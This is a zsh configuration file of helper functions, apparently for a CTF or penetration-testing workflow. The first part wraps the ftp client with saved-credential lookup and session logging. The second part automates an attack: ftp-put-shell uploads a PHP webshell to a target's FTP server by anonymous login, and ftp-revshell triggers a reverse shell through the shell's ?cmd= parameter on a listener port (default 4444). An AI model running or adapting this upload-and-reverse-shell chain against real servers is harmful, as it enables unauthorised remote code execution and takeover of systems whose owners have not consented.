# ========================
# FTP client helpers
# ========================

_ftp-creds-save-anon() {
  local ip="$1"
  [[ -z "$ip" || -z "${RECON_APP:-}" ]] && return 0

  local creds_status
  creds_status="$(python3 "$RECON_APP" creds-add "$ip" "$FTP_ANON_USER" "$FTP_ANON_PASS" 2>&1)" || return 0

  case "$creds_status" in
    unchanged) echo "[=] creds: ${FTP_ANON_USER}@${ip}" >&2 ;;
    updated)   echo "[~] creds: ${FTP_ANON_USER}@${ip}" >&2 ;;
    *)         echo "[+] creds: ${FTP_ANON_USER}@${ip} (pass: ${FTP_ANON_PASS})" >&2 ;;
  esac
}

_ftp-log-host() {
  local a
  for a in "$@"; do
    if [[ "$a" == -* ]]; then
      continue
    fi
    if [[ "$a" == *@* ]]; then
      echo "${a##*@}"
      return 0
    fi
    if [[ "$a" =~ '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$' ]] || [[ "$a" =~ ^[a-zA-Z0-9][a-zA-Z0-9.-]*$ ]]; then
      echo "$a"
      return 0
    fi
  done
  echo "${IP:-notarget}"
}

_ftp-log-path() {
  local host="$1"
  local label="${2:-session}"
  local logs
  logs="$(case-logs-dir)" || return 1
  local ts
  ts="$(date +%Y%m%d-%H%M%S)"

  mkdir -p "$logs"
  echo "$logs/ftp_${host}_${label}_${ts}.log"
}

_ftp-run-logged() {
  local label="$1"
  shift
  local host logfile

  host="$(_ftp-log-host "$@")"
  logfile="$(_ftp-log-path "$host" "$label")" || return 1

  echo "[+] logging: $logfile"
  script -q -f "$logfile" -c "command ftp ${(q)@}"
  echo "[+] session log saved: $logfile"
}

_ftp-connect-creds() {
  local ip="$1" user="$2" pass="$3"
  local logfile="$4"
  shift 4
  local -a extra=("$@")

  # .netrc auto-login keeps an interactive ftp session (heredoc + "prompt" exited immediately)
  local netrc
  netrc="$(mktemp "${TMPDIR:-/tmp}/ftp-netrc.XXXXXX")"
  chmod 600 "$netrc"
  {
    print -r "default login $user password $pass"
    print -r "machine $ip login $user password $pass"
  } >"$netrc"

  local -a cmd=(command ftp)
  (( ${#extra[@]} )) && cmd+=("${extra[@]}")
  cmd+=("$ip")

  if [[ -n "$logfile" ]]; then
    echo "[+] logging: $logfile"
    NETRC="$netrc" script -q -f "$logfile" -c "${(q)cmd}"
    echo "[+] session log saved: $logfile"
  else
    NETRC="$netrc" "${cmd[@]}"
  fi
  rm -f "$netrc"
}

_ftp-connect-interactive() {
  local ip="$1" user="$2"
  local logfile="$3"
  shift 3
  local -a extra=("$@")

  local -a cmd=(command ftp)
  (( ${#extra[@]} )) && cmd+=("${extra[@]}")
  if [[ -n "$user" ]]; then
    cmd+=("${user}@${ip}")
  else
    cmd+=("$ip")
  fi

  if [[ -n "$logfile" ]]; then
    echo "[+] logging: $logfile"
    script -q -f "$logfile" -c "${(q)cmd}"
    echo "[+] session log saved: $logfile"
  else
    "${cmd[@]}"
  fi
}

ftp-login() {
  local log=false
  local -a rest=() pos=() a
  local ip="" user="" pass=""

  while [[ $# -gt 0 ]]; do
    case "$1" in
      -l|--log)
        log=true
        shift
        ;;
      *)
        if [[ "$1" == -* ]]; then
          rest+=("$1")
        else
          pos+=("$1")
        fi
        shift
        ;;
    esac
  done

  _recon-parse-user-ip "${pos[@]}" || {
    echo "usage: ftp [-l] [user] [ip]  (or: target-set <ip> first)" >&2
    return 1
  }
  ip="$_RECON_IP"
  user="$_RECON_USER"

  if [[ -z "$user" ]]; then
    user="$(_recon-pick-user "$ip")" || {
      echo "[*] no saved creds — interactive login to ${ip}" >&2
      local logfile=""
      if $log; then
        logfile="$(_ftp-log-path "$ip" "session")" || return 1
      fi
      _ftp-connect-interactive "$ip" "" "$logfile" "${rest[@]}"
      return $?
    }
  fi

  local logfile=""
  if $log; then
    logfile="$(_ftp-log-path "$ip" "${user}")" || return 1
  fi

  if ! pass="$(_recon-creds-for-user "$ip" "$user")"; then
    echo "[*] no saved creds for ${user}@${ip} — interactive login" >&2
    python3 "$RECON_APP" ssh-last-set "$ip" "$user" >/dev/null 2>&1
    echo "[+] connecting: ftp://${user}@${ip}" >&2
    _ftp-connect-interactive "$ip" "$user" "$logfile" "${rest[@]}"
    return $?
  fi

  python3 "$RECON_APP" ssh-last-set "$ip" "$user" >/dev/null 2>&1

  echo "[+] connecting: ftp://${user}@${ip}" >&2

  _ftp-connect-creds "$ip" "$user" "$pass" "$logfile" "${rest[@]}"
}

# Wrap system ftp; uses recon creds when available (like ssh)
ftp() {
  local log=false
  local anon=false
  local -a args=()

  while [[ $# -gt 0 ]]; do
    case "$1" in
      -l|--log)
        log=true
        shift
        ;;
      -A)
        anon=true
        args+=("$1")
        shift
        ;;
      -h|--help)
        echo "usage: ftp [-l] [user] [ip]"
        echo "  ftp vigilante        user + \$IP — creds-list あれば自動、なければ対話ログイン"
        echo "  ftp vigilante@\$IP   explicit"
        echo "  ftp                  \$IP のみ（creds-list から user 選択 or 対話）"
        echo "  anonymous: ftp -A <host>  or  ftpa"
        echo "  plain: command ftp ..."
        return 0
        ;;
      *)
        args+=("$1")
        shift
        ;;
    esac
  done

  if ! $anon; then
    (( $+functions[_case-resolve-from-pwd] )) && _case-resolve-from-pwd 2>/dev/null
    (( $+functions[target-load] )) && [[ -z "${IP:-}" ]] && target-load 2>/dev/null

    if _recon-parse-user-ip "${args[@]}"; then
      if [[ -n "$_RECON_IP" ]]; then
        local -a login_args=()
        $log && login_args+=(-l)
        login_args+=("${args[@]}")
        ftp-login "${login_args[@]}"
        return $?
      fi
    fi
  fi

  if $log; then
    if [[ ${#args[@]} -eq 0 ]]; then
      echo "usage: ftp [-l] [ftp-options...] [host]" >&2
      return 1
    fi
    _ftp-run-logged session "${args[@]}"
  else
    command ftp "${args[@]}"
  fi
}

ftpa() {
  local log=false
  local target=""

  while [[ $# -gt 0 ]]; do
    case "$1" in
      -l|--log)
        log=true
        shift
        ;;
      -h|--help)
        echo "usage: ftpa [-l] [ip]"
        echo "  connect as anonymous@host (default host: \$IP)"
        echo "  saves creds-list entry: anonymous / \$FTP_ANON_PASS (default: anonymous@)"
        echo "  -l  record to cases/<name>/logs/ (requires case-set <name>, or CASE_LOOSE=1)"
        return 0
        ;;
      *)
        target="$1"
        shift
        ;;
    esac
  done

  target="${target:-$(_recon-ip-default 2>/dev/null)}"
  if [[ -z "$target" ]]; then
    echo "usage: ftpa [-l] [ip]  (or: target-set <ip> / case-set <room> first)"
    return 1
  fi

  _ftp-creds-save-anon "$target"

  if $log; then
    _ftp-run-logged anon "anonymous@${target}"
  else
    command ftp "anonymous@${target}"
  fi
}

_ftpa() {
  _arguments \
    '-l[record session log]' \
    '1:ip:($IP)'
}

compdef _ftpa ftpa

# ========================
# FTP upload + web ?cmd= reverse shell (paths per case / flags)
# ========================
#
# Defaults (generic): ftp://IP/shell.php → http://IP/shell.php
# Per-case: cases/<name>/ftp-shell  (see cases/startup/ftp-shell)
# Override: -d -w -n -U  or env FTP_SHELL_*

: "${FTP_SHELL_LOCAL:=/workspace/payloads/webshells/shell.php}"
: "${FTP_SHELL_REMOTE_DIR:=}"
: "${FTP_SHELL_REMOTE_NAME:=shell.php}"
: "${FTP_SHELL_WEB_PREFIX:=}"

_ftp-shell-case-file() {
  [[ -n "${CASE_HOME:-}" ]] && echo "$CASE_HOME/ftp-shell"
}

# Load cases/<room>/ftp-shell (KEY=value) into FTP_SHELL_* when entering room
_ftp-shell-load-case() {
  local f line key val
  f="$(_ftp-shell-case-file)"
  [[ -f "$f" ]] || return 0

  while IFS= read -r line || [[ -n "$line" ]]; do
    [[ "$line" =~ '^[[:space:]]*#' || -z "${line//[[:space:]]/}" ]] && continue
    [[ "$line" != *"="* ]] && continue
    key="${line%%=*}"
    val="${line#*=}"
    key="${key//[[:space:]]/}"
    val="${val#"${val%%[![:space:]]*}\"}"}"
    val="${val%"${val##*[![:space:]]}\"}"}"
    case "$key" in
      LOCAL|FTP_SHELL_LOCAL) FTP_SHELL_LOCAL="$val" ;;
      REMOTE_DIR|FTP_SHELL_REMOTE_DIR) FTP_SHELL_REMOTE_DIR="$val" ;;
      REMOTE_NAME|FTP_SHELL_REMOTE_NAME) FTP_SHELL_REMOTE_NAME="$val" ;;
      WEB_PREFIX|FTP_SHELL_WEB_PREFIX) FTP_SHELL_WEB_PREFIX="$val" ;;
      SHELL_URL|FTP_SHELL_URL) FTP_SHELL_URL="$val" ;;
    esac
  done <"$f"
}

_ftp-shell-reset-case() {
  unset FTP_SHELL_URL
  FTP_SHELL_LOCAL="/workspace/payloads/webshells/shell.php"
  FTP_SHELL_REMOTE_DIR=""
  FTP_SHELL_REMOTE_NAME="shell.php"
  FTP_SHELL_WEB_PREFIX=""
  _ftp-shell-load-case
}

_ftp-anon-creds() {
  local ip="$1"
  local user="${FTP_ANON_USER}" pass="${FTP_ANON_PASS}"

  if pass="$(_recon-creds-for-user "$ip" "$user" 2>/dev/null)"; then
    echo "$user" "$pass"
    return 0
  fi
  echo "$user" "$pass"
}

_ftp-put-file() {
  local ip="$1" remote_path="$2" local_file="$3"
  local user pass remote_dir remote_name

  if [[ ! -f "$local_file" ]]; then
    echo "[-] file not found: $local_file" >&2
    return 1
  fi

  read -r user pass <<<"$(_ftp-anon-creds "$ip")"
  remote_dir="${remote_path:h}"
  remote_name="${remote_path:t}"

  echo "[*] FTP put: ${local_file} → ftp://${ip}/${remote_path}" >&2
  if curl -sS --user "${user}:${pass}" -T "$local_file" "ftp://${ip}/${remote_path}"; then
    return 0
  fi

  echo "[!] curl FTP failed — trying ftp(1)..." >&2
  ftp -n <<EOF
open ${ip}
user ${user} ${pass}
binary
$([[ -n "$remote_dir" && "$remote_dir" != "." ]] && print -r "cd ${remote_dir}")
put ${local_file} ${remote_name}
bye
EOF
}

_ftp-shell-remote-path() {
  local name="${1:-$FTP_SHELL_REMOTE_NAME}"
  if [[ -n "$FTP_SHELL_REMOTE_DIR" ]]; then
    echo "${FTP_SHELL_REMOTE_DIR}/${name}"
  else
    echo "$name"
  fi
}

_ftp-shell-url() {
  local ip="$1" name="${2:-$FTP_SHELL_REMOTE_NAME}"

  if [[ -n "${FTP_SHELL_URL:-}" ]]; then
    echo "$FTP_SHELL_URL"
    return 0
  fi

  local prefix="${FTP_SHELL_WEB_PREFIX}" rel
  rel="$(_ftp-shell-remote-path "$name")"
  if [[ -n "$prefix" ]]; then
    [[ "$prefix" != /* ]] && prefix="/$prefix"
    prefix="${prefix%/}"
    echo "http://${ip}${prefix}/${rel}"
  else
    echo "http://${ip}/${rel}"
  fi
}

_ftp-shell-help() {
  echo "usage: $1 [options] [port] [ip]"
  echo "  FTP put → http://\$IP<WEB_PREFIX>/<REMOTE_DIR>/shell.php → ?cmd= revshell"
  echo ""
  echo "options:"
  echo "  -d <dir>     FTP subdir on server (only if that folder exists; default: root)"
  echo "  -w <prefix>  HTTP prefix before remote path (e.g. /files + dir=uploads → /files/uploads/shell.php)"
  echo "  -U <url>     full shell URL (skip path math; for -u trigger)"
  echo "  -n <name>    remote filename (default: shell.php)"
  echo "  -p <path>    local payload file"
  echo "  -P <port>    revshell port (ftp-revshell only, default: 4444)"
  echo "  -u           skip upload (ftp-revshell only)"
  echo ""
  echo "per-case: cases/<name>/ftp-shell   session: export FTP_SHELL_*"
  echo "defaults: ftp://\$IP/shell.php  →  http://\$IP/shell.php"
}

# upload shell to FTP
ftp-put-shell() {
  _ftp-shell-reset-case

  local ip="" local_file="$FTP_SHELL_LOCAL"
  local remote_name="$FTP_SHELL_REMOTE_NAME" remote_dir="$FTP_SHELL_REMOTE_DIR"
  local web_prefix="$FTP_SHELL_WEB_PREFIX"

  while [[ $# -gt 0 ]]; do
    case "$1" in
      -h|--help)
        _ftp-shell-help "ftp-put-shell"
        return 0
        ;;
      -p)
        local_file="$2"
        shift 2
        ;;
      -n)
        remote_name="$2"
        shift 2
        ;;
      -d)
        remote_dir="$2"
        shift 2
        ;;
      -w)
        web_prefix="$2"
        shift 2
        ;;
      -U)
        FTP_SHELL_URL="$2"
        shift 2
        ;;
      *)
        ip="$1"
        shift
        ;;
    esac
  done

  ip="${ip:-${IP:-}}"
  if [[ -z "$ip" ]]; then
    echo "usage: ftp-put-shell [options] [ip]  (or: target-set <ip> first)" >&2
    return 1
  fi

  FTP_SHELL_REMOTE_DIR="$remote_dir"
  FTP_SHELL_REMOTE_NAME="$remote_name"
  FTP_SHELL_WEB_PREFIX="$web_prefix"

  local remote_path url
  remote_path="$(_ftp-shell-remote-path "$remote_name")"
  url="$(_ftp-shell-url "$ip" "$remote_name")"

  echo "[*] put:  ftp://${ip}/${remote_path}" >&2
  echo "[*] web:  ${url}" >&2

  _ftp-creds-save-anon "$ip"
  _ftp-put-file "$ip" "$remote_path" "$local_file" || return 1

  echo "[+] done"
  echo "[i] test: shell-cmd $url id"
}

# upload (optional) + trigger reverse shell via ?cmd=
ftp-revshell() {
  local port="4444" ip="" skip_upload=false
  local -a put_opts=()

  while [[ $# -gt 0 ]]; do
    case "$1" in
      -h|--help)
        _ftp-shell-help "ftp-revshell"
        echo "  alias: ftprsh"
        echo "  prep: listen [port] in another terminal"
        return 0
        ;;
      -u|--no-upload)
        skip_upload=true
        shift
        ;;
      -P)
        port="$2"
        shift 2
        ;;
      -d|-w|-n|-p|-U)
        put_opts+=("$1" "$2")
        shift 2
        ;;
      *)
        if [[ "$1" =~ $(_recon-ip-re) ]]; then
          ip="$1"
        elif [[ "$1" =~ '^[0-9]+$' ]]; then
          port="$1"
        fi
        shift
        ;;
    esac
  done

  ip="${ip:-${IP:-}}"
  if [[ -z "$ip" ]]; then
    echo "usage: ftp-revshell [options] [port] [ip]" >&2
    echo "  alias: ftprsh" >&2
    return 1
  fi

  local url
  if ! $skip_upload; then
    put_opts+=("$ip")
    ftp-put-shell "${put_opts[@]}" || return 1
    url="$(_ftp-shell-url "$ip")"
  else
    _ftp-shell-reset-case
    while (( ${#put_opts[@]} >= 2 )); do
      case "$put_opts[1]" in
        -d) FTP_SHELL_REMOTE_DIR="$put_opts[2]" ;;
        -w) FTP_SHELL_WEB_PREFIX="$put_opts[2]" ;;
        -n) FTP_SHELL_REMOTE_NAME="$put_opts[2]" ;;
        -p) FTP_SHELL_LOCAL="$put_opts[2]" ;;
        -U) FTP_SHELL_URL="$put_opts[2]" ;;
      esac
      put_opts=("${put_opts[@]:3}")
    done
    url="$(_ftp-shell-url "$ip")"
    echo "[*] skip upload (-u)" >&2
    echo "[+] web: $url" >&2
  fi

  echo "========================"
  echo "[FTP RSH] $ip → $url"
  echo "[!] other terminal: listen $port"
  echo "========================"

  _webrsh-trigger "$url" "$port"
}

alias ftprsh='ftp-revshell'

_ftprsh() {
  _arguments \
    '-u[skip upload]' \
    '-P[listener port]:port:' \
    '-d[remote dir]:directory:' \
    '-w[web prefix]:prefix:' \
    '1:port:(4444 5555)' \
    '2:ip:($IP)'
}

compdef _ftprsh ftp-revshell ftprsh
